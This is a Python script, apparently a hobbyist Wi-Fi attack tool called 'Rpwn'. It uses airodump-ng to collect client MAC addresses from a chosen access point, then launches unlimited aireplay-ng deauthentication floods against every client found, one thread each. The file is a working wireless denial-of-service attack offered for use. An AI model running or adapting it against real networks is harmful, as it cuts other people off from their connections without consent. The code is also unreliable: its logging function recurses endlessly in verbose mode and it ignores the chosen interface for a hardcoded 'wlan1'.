from colorama import *
import argparse
from message import *
import threading
import os
import re
import subprocess
import time

logo = f"""
Rpwn - Rasmnout Tool
"""
print(logo)

parser = argparse.ArgumentParser(description="Wi-Fi PWN Attack Tool")
parser.add_argument("-i", "--interface", required=True, help="Specify the network interface")
#parser.add_argument("-random", action="store_true", help="Perform pwn attack on random Wi-Fi networks")
parser.add_argument("-Tb", "--target-bssid", help="Specify the target Wi-Fi BSSID for pwn attack")
parser.add_argument("-c", "--channel", help="Specify the Channel for pwn attack")
parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")

args = parser.parse_args()

def info(message):
    if args.verbose:
        info(f"{message}")

def pwnattack(target_bssid=None, channel=None, interface=None):
    if target_bssid == None:
        info("No BSSID specified")
    else:
        info(f"Starting attack at {target_bssid} on channel {channel}")
        bssid = target_bssid
        access = target_bssid
        
        def deauth():
            time.sleep(1.5)
            def read_macs(file_path):
                with open(file_path, "r") as f:
                    macs = f.readlines()
                return [mac.strip() for mac in macs]

            def deauth_mac(interface, target_mac, access_point_mac, count=0):
                info(f"Starting deauth attack on MAC {target_mac} from access point {access_point_mac}")
                command = ["sudo", "aireplay-ng", "--deauth", "0", "-a", access_point_mac, "-c", target_mac, interface]
                subprocess.run(command, text=False)
            
            mac_file = "unique_macs.txt"
            mac_addresses = read_macs(mac_file)
            info(f"MAC addresses to attack: {mac_addresses}")
            
            cmd_channel = f"iwconfig {interface} channel {channel}"
            os.system(cmd_channel)
            info(f"Channel {channel} set for {interface}")
            
            for mac in mac_addresses:
                info(f"Attacking MAC address: {mac}")
                threading.Thread(target=deauth_mac, args=(interface, mac, access)).start()

        def listen():
            os.system("rm output_rpwnClients*")
            mac_addresses = set()
            
            def listener():
                time.sleep(1.5)
                while True:
                    try:
                        while not os.path.exists("output_rpwnClients-01.log.csv"):
                            time.sleep(0.1)  # Wait until the file exists
                        with open("output_rpwnClients-01.log.csv", "r") as f:
                            output = f.readlines()
                        with open("unique_macs.txt", "a") as output_file:  # Open for appending
                            for line in output:
                                mac_match = re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', line)
                                if mac_match:
                                    mac = mac_match.group(0)
                                    if mac not in mac_addresses:
                                        mac_addresses.add(mac)
                                        output_file.write(f"{mac}\n")  # Write each MAC address
                                        info(f"Found device: {mac}")  # Print each MAC address
                    except Exception as e:
                        info(f"Error in listen: {e}")
                        continue

            def run():
                try:
                    cmd = ["sudo", "airodump-ng", "--bssid", f"{bssid}", "--channel", f"{channel}", "--write", "output_rpwnClients", "wlan1"]
                    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    stdout, stderr = process.communicate()
                    if stderr:
                        error(f"Error in run: {stderr.decode()}")
                    info("Started airodump-ng to capture clients")
                except Exception as e:
                    error(f"Error in run: {e}")

            threading.Thread(target=run).start()
            threading.Thread(target=listener).start()

        threading.Thread(target=listen).start()
        threading.Thread(target=deauth).start()

#if args.random:
#    info("Attacking random Wi-Fi networks")

if args.target_bssid:
    if args.channel:
        if args.interface:
            info("Starting the PWN Attack")
            #os.system("echo '' > unique_macs.txt")
            pwnattack(target_bssid=args.target_bssid, channel=args.channel, interface=args.interface)
